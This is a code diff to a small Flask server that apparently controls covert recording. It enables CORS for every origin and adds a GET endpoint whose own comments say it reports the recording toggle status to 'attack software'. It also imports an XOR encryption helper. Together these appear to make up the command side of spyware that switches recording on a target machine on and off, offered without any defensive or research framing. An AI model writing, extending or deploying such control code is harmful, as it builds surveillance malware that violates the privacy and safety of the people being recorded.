@@ -1,12 +1,13 @@
 import os
 import json
 import logging
+from flask_cors import CORS
 from flask import Flask, request, jsonify
 from config.config_server import NAME_FILE
 from xor_encryption import XOREncryption
 
 app = Flask(__name__)
-
+CORS(app)
 name_log = "logs"
 
 if not os.path.exists(name_log):
@@ -175,8 +176,17 @@ def toggle_recording():
     is_recording_active = not is_recording_active
     logging.info(f"Recording status changed to: {is_recording_active}")
 
-    # Emit the new status to all connected clients
     return jsonify({"recording": is_recording_active, "message": "Recording status updated successfully."}), 200
+
+@app.route('/get_toggle_recording', methods=['GET'])
+def get_toggle_recording():
+    """
+    returns the recording toggle status to updated status to attack software.
+    """
+    global is_recording_active
+    logging.info(f"Recording status returned to attack software: {is_recording_active}")
+
+    return jsonify({"recording": is_recording_active, "message": "Recording status returned successfully."}), 200
 
 
 
